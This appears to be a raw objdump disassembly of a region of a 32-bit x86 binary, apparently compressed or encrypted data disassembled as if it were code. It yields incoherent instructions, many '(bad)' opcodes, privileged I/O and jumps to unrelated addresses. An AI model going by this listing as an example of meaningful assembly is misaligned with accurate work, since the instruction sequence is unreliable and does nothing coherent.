  4160e3:	fbstp  TBYTE PTR [edi-0x10]
  4160e6:	ret    0xc1ce
  4160e9:	daa    
  4160ea:	div    DWORD PTR [eax+0x66fc519b]
  4160f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f1:	xor    DWORD PTR [edx],edi
  4160f3:	lahf   
  4160f4:	mov    esp,0xc48f0814
  4160f9:	ja     0x416116
  4160fb:	je     0x4160e9
  4160fd:	test   ah,bh
  4160ff:	dec    ebx
  416100:	daa    
  416101:	test   eax,0x3a4c59ef
  416106:	adc    eax,0x7d5d646a
  41610b:	sti    
  41610c:	inc    edi
  41610d:	push   edi
  41610e:	loope  0x4160b3
  416110:	sbb    ah,dh
  416112:	sub    al,0x7f
  416114:	inc    edi
  416115:	adc    ch,dl
  416117:	retf   
  416118:	mov    edi,0x39556201
  41611d:	mov    ebp,0x4793cd1b
  416122:	adc    eax,0x787eab1a
  416127:	sti    
  416128:	mov    esi,0x79bc0cc0
  41612d:	loop   0x4160e4
  41612f:	(bad)  [esi+0x469adecf]
  416135:	or     al,0xe9
  416137:	or     BYTE PTR [edx-0x42],bl
  41613a:	push   ecx
  41613b:	nop
  41613c:	dec    eax
  41613d:	cli    
  41613e:	(bad)  
  41613f:	sub    eax,0x17c2cbe7
  416144:	retf   
  416145:	lods   al,BYTE PTR ds:[esi]
  416147:	xchg   edx,eax
  416148:	pop    esp
  416149:	shl    DWORD PTR [edi],cl
  41614b:	dec    ebp
  41614c:	mov    es,eax
  41614e:	sub    ebp,DWORD PTR [eax+0x42bdd74b]
  416154:	mov    ah,0xda
  416156:	mov    ebp,DWORD PTR [edi+0x7c]
  416159:	inc    eax
  41615a:	dec    edx
  41615b:	gs push esi
  41615d:	dec    eax
  41615e:	pop    esp
  41615f:	test   bh,dl
  416161:	lds    esi,FWORD PTR [edx]
  416163:	add    al,0x89
  416165:	dec    edi
  416166:	push   cs
  416167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416168:	stos   DWORD PTR es:[edi],eax
  416169:	repz add al,0x9
  41616c:	sub    al,0x5b
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0xb462f3
  4161e5:	mov    ecx,0xee67
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	in     al,dx
  4161ef:	ins    BYTE PTR es:[edi],dx
  4161f0:	int3   
  4161f1:	in     eax,0xc4
  4161f3:	or     cl,dl
  4161f5:	push   esp
  4161f6:	dec    esi
  4161f7:	mov    WORD PTR [edi+0x7c],es
  4161fa:	dec    edi
  4161fb:	outs   dx,DWORD PTR ds:[esi]
  4161fd:	repz add ebx,ecx
  416200:	js     0x41627e
  416202:	and    DWORD PTR [esi-0x17],esi
  416205:	out    dx,al
  416206:	ficomp WORD PTR [edi]
  416208:	arpl   WORD PTR [esi],sp
  41620a:	in     eax,dx
  41620b:	adc    BYTE PTR [edi+0x5d],0xf1
  41620f:	inc    ebp
  416210:	retf   
  416211:	outs   dx,BYTE PTR ds:[esi]
  416212:	repnz retf 0x87e5
  416216:	js     0x4161a9
  416218:	(bad)  
  416219:	popf   
  41621a:	mov    edx,eax
  41621c:	inc    edi
  41621d:	jae    0x41623f
  41621f:	push   0x66
  416221:	and    al,bl
  416223:	test   al,0x2a
  416225:	fistp  QWORD PTR [edx-0x4c2830f7]
  41622b:	imul   esi,ebp,0x6b
  41622e:	retf   0xf89c
  416231:	push   cs
  416232:	mov    eax,0x91d88fcc
  416237:	jmp    0x72e4c208
  41623c:	and    al,0x27
  41623e:	or     cl,BYTE PTR [ecx-0x61]
  416241:	jle    0x416246
  416243:	cmp    eax,0x45ca4411
  416248:	fst    DWORD PTR [esi]
  41624a:	ret    
  41624b:	aam    0x5a
  41624d:	test   al,0x6c
  41624f:	and    DWORD PTR [edx+ebp*8-0x1fdee1e1],0x79d7c335
  41625a:	sbb    DWORD PTR [ebx-0x54],edi
  41625d:	mov    edx,0xbf182a19
  416262:	adc    eax,0xa4df2a8e
  416267:	mov    dh,bl
  416269:	pop    esp
  41626a:	popf   
  41626b:	scas   eax,DWORD PTR es:[edi]
  41626c:	and    BYTE PTR [ecx+0x24933400],dh
  416272:	test   al,0x91
  416274:	test   DWORD PTR [eax+ecx*2+0x1f],0xf0b7067f
  41627c:	js     0x4162d1
  41627e:	and    bl,BYTE PTR [edx]
  416280:	das    
  416281:	aad    0x18
  416283:	sub    BYTE PTR [ebp+0x35],bl
  416286:	(bad)  
  416287:	jl     0x416225
  416289:	mov    ebx,0xf94f8488
  41628e:	pop    edi
  41628f:	fnsave [ebp-0xbac64d4]
  416295:	je     0x4162fe
  416297:	or     dh,BYTE PTR [edi+0x415d63f3]
  41629d:	ins    DWORD PTR es:[edi],dx
  41629e:	jecxz  0x4162f3
  4162a0:	dec    esi
  4162a1:	cs fsubr st(0),st
  4162a4:	dec    edx
  4162a5:	mov    ebx,0x2883343
  4162aa:	sbb    cl,BYTE PTR [ebx]
  4162ac:	mov    ecx,0xe5fb3cd0
  4162b1:	fs fstp st(0)
  4162b4:	mov    eax,0x3a4831f0
  4162b9:	mul    ch
  4162bb:	cwde   
  4162bc:	cwde   
  4162bd:	fprem1 
  4162bf:	sbb    ecx,DWORD PTR [edx+0x64784b4b]
  4162c5:	aas    
  4162c6:	bound  ecx,QWORD PTR [ebp+0x464d7e90]
  4162cc:	dec    ecx
  4162cd:	fisttp DWORD PTR [ecx-0x16]
  4162d0:	push   es
  4162d1:	test   dh,dh
  4162d3:	push   ecx
  4162d4:	jl     0x4162d7
  4162d6:	add    eax,0xf29cd5a4
  4162db:	adc    BYTE PTR [ecx],dl
  4162dd:	popa   
  4162de:	pop    ebp
  4162df:	lahf   
  4162e0:	xchg   ebp,eax
  4162e1:	pop    edi
  4162e2:	dec    eax
  4162e3:	xor    BYTE PTR [edi],dl
  4162e5:	retf   0xecd6
  4162e8:	cs mov dh,0x94
  4162eb:	mov    al,0x14
  4162ed:	cmp    eax,0x0
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x67bf:0x4da0cbee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	xchg   al,bl
  416370:	arpl   WORD PTR [ecx-0x6254f3a3],di
  416376:	cmp    edi,DWORD PTR [esi]
  416378:	cdq    
  416379:	les    ebx,FWORD PTR [ebx+0x2d71289c]
  41637f:	xlat   BYTE PTR ds:[ebx]
  416380:	retf   
  416381:	cwde   
  416382:	push   DWORD PTR [edx]
  416384:	sar    DWORD PTR [ecx+0x72],1
  416387:	cmp    DWORD PTR [edi-0x1745972d],ebx
  41638d:	test   DWORD PTR [eax],esp
  41638f:	dec    edi
  416390:	or     eax,0xfa5b9017
  416395:	imul   ecx,DWORD PTR [ebp-0x6d],0x6f
  416399:	cmp    DWORD PTR [esi-0x38],edi
  41639c:	jle    0x416379
  41639e:	sub    al,0x46
  4163a0:	push   cs
  4163a1:	push   ebp
  4163a2:	jae    0x4163a1
  4163a4:	fld    TBYTE PTR [esi-0x9091810]
  4163aa:	push   cs
  4163ab:	pop    es
  4163ac:	in     eax,0x52
  4163ae:	imul   DWORD PTR [esi-0x78]
  4163b1:	mov    dl,0xdb
  4163b3:	call   DWORD PTR [eax-0x3d]
  4163b6:	pop    esp
  4163b7:	adc    BYTE PTR [ecx-0x31],ch
  4163ba:	or     esp,DWORD PTR [ecx]
  4163bc:	push   ebx
  4163bd:	push   0xffffffe5
  4163bf:	pop    ebp
  4163c0:	fmul   QWORD PTR [edi-0x6f72be0]
  4163c6:	fbld   TBYTE PTR [edi-0xe]
  4163c9:	pop    eax
  4163ca:	daa    
  4163cb:	push   ds
  4163cc:	call   DWORD PTR [ecx+0x70]
  4163cf:	mov    edx,0x302fa1a0
  4163d4:	inc    esi
  4163d5:	pusha  
  4163d6:	dec    esi
  4163d7:	adc    ecx,edi
  4163d9:	and    ah,BYTE PTR [eax]
  4163db:	fs mov dh,0x8b
  4163de:	xchg   BYTE PTR [eax+0x39],cl
  4163e1:	fst    st(5)
  4163e3:	push   ds
  4163e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e5:	in     eax,0x85
  4163e7:	sbb    ch,BYTE PTR [eax-0x3d]
  4163ea:	sar    DWORD PTR [esi+0x5ee021ab],1
  4163f0:	mov    edx,ss
  4163f2:	mov    al,ds:0x62b1a26d
  4163f7:	fistp  WORD PTR [eax-0x1d17d891]
  4163fd:	jp     0x416395
  4163ff:	(bad)  
  416400:	jbe    0x416453
  416402:	arpl   WORD PTR [eax],bp
  416404:	dec    eax
  416405:	fidiv  DWORD PTR [eax+0x49e126fb]
  41640b:	icebp  
  41640c:	mov    ch,BYTE PTR gs:[ecx]
  41640f:	cmp    eax,0x176a2f7e
  416414:	fsubp  st(0),st
  416416:	sbb    BYTE PTR [eax],0x1f
  416419:	add    ch,bl
  41641b:	sbb    eax,0x646db332
  416420:	cwde   
  416421:	loop   0x416428
  416423:	add    eax,0xef193892
  416428:	shr    ch,1
  41642a:	(bad)  
  41642b:	mov    al,ds:0xf07ebca7
  416430:	pop    ss
  416431:	(bad)  
  416432:	and    ch,dl
  416434:	mov    dl,0x2c
  416436:	mov    ch,0x33
  416438:	jecxz  0x4164a4
  41643a:	jo     0x416427
  41643c:	fisubr WORD PTR [ebx-0x41af6e52]
  416442:	adc    BYTE PTR [edi-0x710175c9],bh
  416448:	das    
  416449:	(bad)  
  41644a:	jge    0x416470
  41644c:	ds inc ecx
  41644e:	leave  
  41644f:	jne    0x41640f
  416451:	enter  0x9e56,0x8a
  416455:	dec    eax
  416456:	inc    ebx
  416457:	jo     0x416440
  416459:	mov    DWORD PTR [ebp+0x1b],0xeb916c15
  416460:	adc    al,0x18
  416462:	je     0x416468
  416464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416465:	inc    ebp
  416466:	sub    al,0x90
  416468:	and    ch,bl
  41646a:	or     esi,ebx
  41646c:	lods   eax,DWORD PTR ds:[esi]
  41646d:	int3   
	...
  4164d6:	repz inc ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	sbb    bl,BYTE PTR ds:0xf0676759
  4164e8:	add    BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	add    bl,ah
  4164f0:	not    BYTE PTR [eax-0x29be44a]
  4164f6:	clc    
  4164f7:	jne    0x4164d0
  4164f9:	push   eax
  4164fa:	into   
  4164fb:	sbb    bh,BYTE PTR [esi+0x3a]
  4164fe:	pusha  
  4164ff:	push   ss
  416500:	(bad)
  416503:	addr16 jae 0x4164d9
  416506:	rol    BYTE PTR [edi-0x7353d716],cl
  41650c:	stos   BYTE PTR es:[edi],al
  41650d:	(bad)  [ebx+0x56e6157d]
  416513:	ds inc esp
  416515:	ret    0xfd25
  416518:	aaa    
  416519:	shr    bh,cl
  41651b:	cmp    cl,bh
  41651d:	or     eax,0xb4bea139
  416522:	cs cwde 
  416524:	pushf  
  416525:	or     al,0x3e
  416527:	in     eax,dx
  416528:	sar    BYTE PTR [ebp-0x65313111],0xc
  41652f:	jno    0x416588
  416531:	dec    ebp
  416532:	out    dx,al
  416533:	add    edi,DWORD PTR [ebx]
  416535:	push   ecx
  416536:	in     eax,0x2b
  416538:	sbb    DWORD PTR es:[eax+0xc235d00],ebp
  41653f:	dec    esp
  416540:	cmp    DWORD PTR [ebp-0x6178fed0],0x5b63cc82
  41654a:	sti    
  41654b:	adc    DWORD PTR [edi-0x588864f5],edi
  416551:	push   ebx
  416552:	in     eax,0x3a
  416554:	push   eax
  416555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416556:	repz adc BYTE PTR [eax-0x3c],0x9b
  41655b:	sub    BYTE PTR [esi+ebp*8-0xa4465f2],cl
  416562:	add    BYTE PTR [ecx],0xbd
  416565:	bnd jmp 0x41657f
  416568:	(bad)  
  416569:	ficomp DWORD PTR [ecx]
  41656b:	cmp    eax,DWORD PTR [edx+0x5e98a5cd]
  416571:	gs push es
  416573:	lds    ebx,FWORD PTR [eax-0xb95ca9f]
  416579:	xor    BYTE PTR [ebx+0x50],ah
  41657c:	xchg   ebx,eax
  41657d:	mov    DWORD PTR [edx-0x7d94792d],ecx
  416583:	out    dx,al
  416584:	and    eax,0x7b66f2e3
  416589:	out    dx,eax
  41658a:	and    bl,BYTE PTR [esi+0x78]
  41658d:	cs clc 
  41658f:	and    eax,0xa0b2239d
  416594:	xchg   edx,eax
  416595:	vmwrite esi,DWORD PTR [esi-0x5813d0cd]
  41659c:	outs   dx,DWORD PTR ds:[esi]
  41659d:	xchg   BYTE PTR ds:0xb9132f72,ch
  4165a3:	jae    0x416561
  4165a5:	inc    esp
  4165a6:	jge    0x41654a
  4165a8:	and    eax,0x9854e06c
  4165ad:	adc    esp,DWORD PTR [esi-0x5b6b0739]
  4165b3:	sti    
  4165b4:	cdq    
  4165b5:	dec    edi
  4165b6:	loop   0x416561
  4165b8:	mov    ecx,edx
  4165ba:	jl     0x4165c6
  4165bc:	jb     0x4165b9
  4165be:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4165c1:	dec    esi
  4165c2:	mov    ds:0x9f6dc8b5,eax
  4165c7:	add    eax,0xa97cd861
  4165cc:	(bad)  
  4165cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165ce:	imul   esi,DWORD PTR [eax-0x861c858],0x925136c1
  4165d8:	out    0x70,al
  4165da:	fsub   DWORD PTR [edi-0x54]
  4165dd:	stos   DWORD PTR es:[edi],eax
  4165de:	mov    eax,ds:0x2869657
  4165e3:	repnz pop es
  4165e5:	out    dx,eax
  4165e6:	sbb    al,0x2
  4165e8:	inc    ecx
  4165e9:	mov    eax,ds:0xe6609ce
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x1cb04354]
  416663:	add    DWORD PTR [eax+0x52],ebp
  416666:	addr16 icebp 
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	loopne 0x416642
  416670:	xor    BYTE PTR ds:0xe9b003a4,ah
  416676:	xor    BYTE PTR [ecx-0xa],dl
  416679:	and    ch,ah
  41667b:	rcl    BYTE PTR [edi],1
  41667d:	xchg   edi,eax
  41667e:	shr    DWORD PTR [ecx],cl
  416680:	inc    edx
  416681:	ins    BYTE PTR es:[edi],dx
  416682:	mov    bh,0xb3
  416684:	aas    
  416685:	cmp    cl,BYTE PTR [esi+0x33]
  416688:	cmp    BYTE PTR [esi],0xdf
  41668b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41668c:	cmp    BYTE PTR cs:[esi-0x10fbfa67],0x35
  416694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416695:	dec    edx
  416696:	ret    
  416697:	jb     0x4166f0
  416699:	xor    BYTE PTR [eax+0x69],0x39
  41669d:	or     BYTE PTR [ebx+ebx*2+0x6e],0x42
  4166a2:	test   BYTE PTR [ebp+esi*2+0x199519da],al
  4166a9:	repnz and ch,0xc6
  4166ad:	and    edx,esi
  4166af:	pop    ebx
  4166b0:	imul   esi,DWORD PTR [ebx+ebp*4+0x4],0x414cef39
  4166b8:	pushf  
  4166b9:	data16 (bad) 
  4166bb:	jnp    0x4166e8
  4166bd:	jl     0x416661
  4166bf:	loope  0x416686
  4166c1:	daa    
  4166c2:	in     eax,dx
  4166c3:	cmp    ecx,DWORD PTR [eax+0x4e]
  4166c6:	and    al,0xd
  4166c8:	sub    eax,DWORD PTR [esp+eax*4+0x58ad2607]
  4166cf:	mov    ds:0x5a62561d,al
  4166d4:	mov    dl,0xa
  4166d6:	ss popf 
  4166d8:	retf   
  4166d9:	mov    ch,0x4c
  4166db:	arpl   WORD PTR fs:[esi+0x23e58faf],cx
  4166e2:	fs jno 0x416707
  4166e5:	xchg   edx,eax
  4166e6:	dec    edx
  4166e7:	jmp    0x7e0b7217
  4166ec:	das    
  4166ed:	inc    edx
  4166ee:	jo     0x41672d
  4166f0:	mov    cl,0x67
  4166f2:	dec    edx
  4166f3:	cmp    BYTE PTR [ebx-0x7f],bl
  4166f6:	xchg   BYTE PTR [ebx-0x3e],bh
  4166f9:	in     al,0x4a
  4166fb:	or     al,0x13
  4166fd:	jb     0x41668e
  4166ff:	jo     0x4166f2
  416701:	(bad)  [ebx]
  416703:	repz jecxz 0x4166ca
  416706:	pop    ds
  416707:	sub    al,0xb0
  416709:	dec    eax
  41670a:	test   eax,0xa93432e6
  41670f:	hlt    
  416710:	xor    edx,DWORD PTR [ecx+0x4e4e3c5]
  416716:	dec    ecx
  416717:	jecxz  0x4166fc
  416719:	outs   dx,BYTE PTR cs:[esi]
  41671b:	ret    
  41671c:	mov    ch,bl
  41671e:	shl    BYTE PTR [ecx+0x2d],1
  416721:	retf   
  416722:	pop    ecx
  416723:	inc    ebx
  416724:	adc    dl,BYTE PTR gs:[ecx]
  416727:	nop
  416728:	dec    edx
  416729:	sti    
  41672a:	xchg   esi,eax
  41672b:	jno    0x41675d
  41672d:	jmp    0x2da05633
  416732:	adc    eax,0x2f1c876a
  416737:	mov    edx,edi
  416739:	mov    edx,ecx
  41673b:	jb     0x4166c5
  41673d:	aad    0xed
  41673f:	jns    0x416782
  416741:	or     WORD PTR [esi-0x7eaf1771],si
  416748:	and    BYTE PTR [ecx],dh
  41674a:	mov    eax,ds:0x2ce7437c
  41674f:	sbb    esp,esp
  416751:	pop    es
  416752:	mov    eax,0xfd5112dd
  416757:	push   eax
  416758:	xchg   ecx,eax
  416759:	push   edi
  41675a:	scas   al,BYTE PTR es:[edi]
  41675b:	pop    esi
  41675c:	inc    edx
  41675d:	div    bl
  41675f:	xor    bh,BYTE PTR [ebx-0x77]
  416762:	fisub  DWORD PTR [edi+0x3c]
  416765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416766:	xor    eax,0x2f7f38e7
  41676b:	inc    edx
  41676c:	xchg   esi,eax
  41676d:	xchg   DWORD PTR [eax],eax
	...
  4167d3:	add    BYTE PTR [eax],al
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	inc    ebx
  4167e3:	lods   eax,DWORD PTR ds:[esi]
  4167e4:	nop
  4167e5:	(bad)  
  4167e6:	repnz add BYTE PTR [bx+si],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	sbb    al,0x6d
  4167f0:	dec    ebx
  4167f1:	cs xchg edx,eax
  4167f3:	mov    BYTE PTR [esp+ebp*4],cl
  4167f6:	sub    cl,BYTE PTR fs:[esi+0x49fc43b3]
  4167fd:	pop    ss
  4167fe:	clc    
  4167ff:	mov    bh,0xf
  416801:	sbb    ah,BYTE PTR ds:0x749ba8e9
  416807:	out    0x22,eax
  416809:	mov    ss,WORD PTR ds:0xa7edfab1
  41680f:	fld    DWORD PTR [esi]
  416811:	fild   DWORD PTR [ebx]
  416813:	mov    WORD PTR es:[eax-0x79cf99b5],?
  41681a:	mov    bl,0xb0
  41681c:	and    edi,esi
  41681e:	sub    BYTE PTR ds:0x1d057740,bh
  416824:	rcr    BYTE PTR [ecx],cl
  416826:	retf   0xf5c9
  416829:	arpl   WORD PTR [edx+0x46],dx
  41682c:	xor    bx,WORD PTR ds:0x8e945a14
  416833:	xchg   ecx,eax
  416834:	sub    DWORD PTR [ebx],ebp
  416836:	shl    DWORD PTR [eax-0x101b0744],cl
  41683c:	and    al,0x24
  41683e:	jo     0x416802
  416840:	pop    edx
  416841:	mov    edi,0x91e6fc03
  416846:	or     al,0x1b
  416848:	mov    dl,0x55
  41684a:	hlt    
  41684b:	aad    0xc
  41684d:	push   eax
  41684e:	sbb    BYTE PTR [ebp+0x36e624dd],0x44
  416855:	mov    esp,0xb122c9c4
  41685a:	lock or dh,BYTE PTR [edi-0x65]
  41685e:	in     al,0xd5
  416860:	xchg   ebx,eax
  416861:	iret   
  416862:	mov    al,0x59
  416864:	fiadd  WORD PTR [esi+0x337995b9]
  41686a:	js     0x4168b5
  41686c:	xchg   dl,dh
  41686e:	cwde   
  41686f:	or     al,dh
  416871:	pop    ebx
  416872:	dec    esi
  416873:	bound  ebp,QWORD PTR [esi]
  416875:	push   esp
  416876:	dec    edi
  416877:	in     eax,dx
  416878:	gs mov esi,0x1512f47c
  41687e:	rol    BYTE PTR [edi+0x31560470],cl
  416884:	push   esp
  416885:	shl    BYTE PTR [ecx+0x20],0x2f
  416889:	mov    BYTE PTR [ebp-0x561cbf3f],ah
  41688f:	ds jge 0x4168c5
  416892:	mov    esi,0x6f364b47
  416897:	xlat   BYTE PTR ds:[ebx]
  416898:	mov    ch,0x7d
  41689a:	push   ss
  41689b:	push   0x63a40c68
  4168a0:	xchg   ebx,eax
  4168a1:	adc    eax,0xd37beb66
  4168a6:	ss xchg esp,eax
  4168a8:	sub    BYTE PTR [edi+0x6d],0x57
  4168ac:	xor    edx,DWORD PTR [edi-0x6488c661]
  4168b2:	loope  0x41687a
  4168b4:	pop    es
  4168b5:	out    dx,al
  4168b6:	repnz cmp eax,0x9e1bb5a4
  4168bc:	ins    BYTE PTR es:[edi],dx
  4168bd:	mov    ds:0xdb141341,eax
  4168c2:	and    esi,DWORD PTR [esi+edi*1+0xedbf814]
  4168c9:	push   eax
  4168ca:	loope  0x4168a9
  4168cc:	push   edi
  4168cd:	mov    al,0xb2
  4168cf:	pusha  
  4168d0:	fcom   QWORD PTR [esi+ecx*1+0x119d708c]
  4168d7:	mov    es,WORD PTR [edx-0x6b]
  4168da:	arpl   si,bx
  4168dc:	hlt    
  4168dd:	add    BYTE PTR [eax-0x323a2682],bl
  4168e3:	int3   
  4168e4:	shl    DWORD PTR [eax-0x49853cd4],1
  4168ea:	rcr    BYTE PTR [ebx],cl
  4168ec:	xchg   edi,eax
  4168ed:	inc    eax
	...
  416956:	shr    DWORD PTR [edi-0x4810cfa],1
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x6bef5072
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	loopne 0x416926
  416970:	dec    ebx
  416971:	jno    0x416910
  416973:	je     0x4169af
  416975:	sbb    BYTE PTR [ebp+0x68],cl
  416978:	inc    edi
  416979:	push   esp
  41697a:	ret    0xb368
  41697d:	or     ebp,esp
  41697f:	sbb    eax,0xa8a74077
  416984:	jmp    0xd8fa:0xfc3f7440
  41698b:	jl     0x4169cf
  41698d:	and    dh,BYTE PTR [ebx]
  41698f:	outs   dx,BYTE PTR ds:[esi]
  416990:	add    BYTE PTR [eax-0x802ba53],bl
  416996:	jmp    0xdb3e7946
  41699b:	sub    DWORD PTR [edx+0x53],0x51cd6a8
  4169a2:	adc    eax,0xe9e68c91
  4169a7:	or     eax,0x344f002d
  4169ac:	stos   DWORD PTR es:[edi],eax
  4169ad:	je     0x416998
  4169af:	adc    eax,0x846a18b3
  4169b4:	mov    edi,0x97d2fbfb
  4169b9:	int3   
  4169ba:	arpl   WORD PTR [ebx-0xf],di
  4169bd:	(bad)  
  4169be:	mov    ebp,0xdff10008
  4169c3:	mov    ch,0x6e
  4169c5:	sbb    eax,0x66ba92a
  4169ca:	and    eax,0x38e84ca
  4169cf:	xchg   edi,eax
  4169d0:	lods   eax,DWORD PTR ds:[esi]
  4169d1:	fdivr  DWORD PTR [ecx+0x658b4efa]
  4169d7:	inc    esp
  4169d8:	cld    
  4169d9:	std    
  4169da:	jecxz  0x4169d8
  4169dc:	dec    eax
  4169dd:	(bad)  
  4169de:	je     0x416a5c
  4169e0:	xlat   BYTE PTR ds:[ebx]
  4169e1:	aas    
  4169e2:	stos   DWORD PTR es:[edi],eax
  4169e3:	leave  
  4169e4:	out    0x73,al
  4169e6:	pop    esp
  4169e7:	push   ds
  4169e8:	loope  0x416a45
  4169ea:	xor    ebx,edi
  4169ec:	into   
  4169ed:	jmp    0xca5bb509
  4169f2:	mov    edx,0xc66acb58
  4169f7:	and    esi,DWORD PTR [ebx+0x31235f21]
  4169fd:	push   edx
  4169fe:	xchg   ebx,eax
  4169ff:	adc    al,0xdd
  416a01:	nop
  416a02:	pop    ebp
  416a03:	xchg   edx,eax
  416a04:	rol    DWORD PTR [edx-0x6d2a440f],0x3c
  416a0b:	add    ecx,eax
  416a0d:	jg     0x4169d8
  416a0f:	and    al,0x8
  416a11:	pop    ebp
  416a12:	mov    edx,0x8c70cc1
  416a17:	sbb    BYTE PTR [ebp-0x55d6c289],dh
  416a1d:	adc    ebx,DWORD PTR [ebx]
  416a1f:	nop
  416a20:	lds    ebx,FWORD PTR [ebx-0x18]
  416a23:	inc    ebx
  416a24:	repnz and al,0xd6
  416a27:	arpl   WORD PTR [esi-0x4f7b6ccc],cx
  416a2d:	cmp    eax,0xd204c893
  416a32:	mov    DWORD PTR [edi+0xcb902eb],esp
  416a38:	inc    esp
  416a39:	(bad)  
  416a3a:	in     al,dx
  416a3b:	jb     0x416a76
  416a3d:	push   cs
  416a3e:	inc    edi
  416a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a40:	je     0x416a41
  416a42:	sub    ebp,DWORD PTR [ecx+0x64ec5e60]
  416a48:	aad    0x78
  416a4a:	jecxz  0x416a77
  416a4c:	xlat   BYTE PTR ds:[ebx]
  416a4d:	mov    esp,0x6c7adb68
  416a52:	mov    ecx,0xe2b754e5
  416a57:	dec    esi
  416a58:	dec    esi
  416a59:	dec    ebx
  416a5a:	mov    bl,0x5e
  416a5c:	sar    DWORD PTR [edx-0x4d7780a9],0xa3
  416a63:	fisub  DWORD PTR [ebx-0x36]
  416a66:	xor    ch,dh
  416a68:	push   ebx
  416a69:	pop    esi
  416a6a:	jecxz  0x416a91
  416a6c:	or     bl,ah
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0x6ee30ba3
  416ae4:	lock sbb al,0x67
  416ae7:	hlt    
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	loope  0x416b20
  416af0:	ins    BYTE PTR es:[edi],dx
  416af1:	hlt    
  416af2:	bound  eax,QWORD PTR [edx+0x276e956f]
  416af8:	push   edx
  416af9:	test   eax,0xa05d2708
  416afe:	dec    ecx
  416aff:	adc    dh,BYTE PTR [edi]
  416b01:	lds    ecx,FWORD PTR [ebx-0x1e0c647f]
  416b07:	cmc    
  416b08:	into   
  416b09:	retf   0x9ef
  416b0c:	call   0x145cbf19
  416b11:	adc    edi,edx
  416b13:	stos   DWORD PTR es:[edi],eax
  416b14:	xchg   ebx,eax
  416b15:	adc    edx,DWORD PTR [ecx]
  416b17:	pop    ds
  416b18:	inc    ecx
  416b19:	loopne 0x416b17
  416b1b:	enter  0x96e4,0xe6
  416b1f:	sbb    BYTE PTR [ebp+0x59fdb5cc],bl
  416b25:	and    DWORD PTR [ecx+0x78],edx
  416b28:	push   0x7
  416b2a:	cmp    DWORD PTR ds:0x1c21a89b,edx
  416b30:	shr    BYTE PTR ds:0x3070f0e0,1
  416b36:	pop    ss
  416b37:	xor    bh,dl
  416b39:	dec    ebp
  416b3a:	daa    
  416b3b:	inc    ebp
  416b3c:	fld    TBYTE PTR [edx+0x3c]
  416b3f:	ja     0x416b2b
  416b41:	popa   
  416b42:	jmp    0x416b2e
  416b44:	xchg   ebp,eax
  416b45:	push   edi
  416b46:	push   ecx
  416b47:	mov    ecx,0x9faa2154
  416b4c:	sbb    DWORD PTR [ecx],esp
  416b4e:	outs   dx,DWORD PTR fs:[esi]
  416b50:	in     al,dx
  416b51:	mov    edx,0xd6aec323
  416b56:	cmp    DWORD PTR [edx+0x60759ea1],ebp
  416b5c:	mov    cl,0xa6
  416b5e:	mov    ebx,0xd0d0fd6
  416b63:	adc    al,0x12
  416b65:	out    0xc2,al
  416b67:	sub    al,0x6f
  416b69:	and    eax,0x22f1d452
  416b6e:	fiadd  DWORD PTR [esi+0x783b4f13]
  416b74:	les    esi,FWORD PTR ds:0x82223997
  416b7a:	shl    BYTE PTR [edx+0x5e2a91e1],1
  416b80:	stos   BYTE PTR es:[edi],al
  416b81:	inc    edx
  416b82:	mov    esi,0xfee5c076
  416b87:	imul   ebx,DWORD PTR [ebp+0x2053ca47],0xffffffec
  416b8e:	int3   
  416b8f:	inc    eax
  416b90:	cmc    
  416b91:	dec    ebp
  416b92:	mov    ch,0x50
  416b94:	add    al,dl
  416b96:	mov    al,ds:0xdbe06982
  416b9b:	pop    DWORD PTR [ecx+0x4b]
  416b9e:	sahf   
  416b9f:	sbb    esi,DWORD PTR [ebx-0x63a3c293]
  416ba5:	dec    ebp
  416ba6:	cmp    bh,BYTE PTR [eax]
  416ba8:	repnz imul ebx,DWORD PTR [ebx+esi*8+0x10],0x27
  416bae:	dec    edi
